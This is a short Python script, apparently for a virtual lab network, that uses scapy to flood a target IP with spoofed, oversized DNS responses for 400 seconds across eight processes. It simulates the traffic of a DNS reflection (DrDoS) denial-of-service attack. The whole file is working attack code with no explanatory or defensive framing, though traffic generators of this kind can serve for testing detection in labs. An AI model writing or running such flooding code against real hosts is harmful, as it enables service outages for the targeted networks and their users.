from scapy.all import *
import random
import time
from multiprocessing import Process

victim_ip = "192.168.2.165"
duration = 400
interface = "virbr-labs"
domain = "google.com"

def build_answers():
    answers = None
    for i in range(4):
        rr = (
            DNSRR(rrname=domain, type="A", ttl=300, rdata=f"142.250.{random.randint(1,254)}.{random.randint(1,254)}") /
            DNSRR(rrname=domain, type="NS", ttl=300, rdata="ns1.google.com") /
            DNSRR(rrname=domain, type="NS", ttl=300, rdata="ns2.google.com") /
            DNSRR(rrname=domain, type="MX", ttl=300, rdata="smtp.google.com") /
            DNSRR(rrname=domain, type="TXT", ttl=300, rdata="v=spf1 include:_spf.google.com ~all " + "A" * 150)
        )
        answers = rr if answers is None else answers / rr
    return answers

def flood_worker(worker_id):
    reflectors = [str(RandIP()._fix()) for _ in range(7)]
    end_time = time.time() + duration
    while time.time() < end_time:
        reflector_ip = random.choice(reflectors)
        pkt = (
            Ether() /
            IP(src=reflector_ip, dst=victim_ip) /
            UDP(sport=53, dport=random.randint(1024, 65535)) /
            DNS(
                id=random.randint(0, 65535),
                qr=1, aa=1, rd=1, ra=1,
                qd=DNSQR(qname=domain, qtype=255),
                ancount=20,
                an=build_answers()
            )
        )
        sendp(pkt, iface=interface, verbose=False)

if __name__ == "__main__":
    num_workers = 8
    processes = [Process(target=flood_worker, args=(i,)) for i in range(num_workers)]
    for p in processes:
        p.start()
    print("DrDoS started!")
    for p in processes:
        p.join()
    print("DrDoS done!")
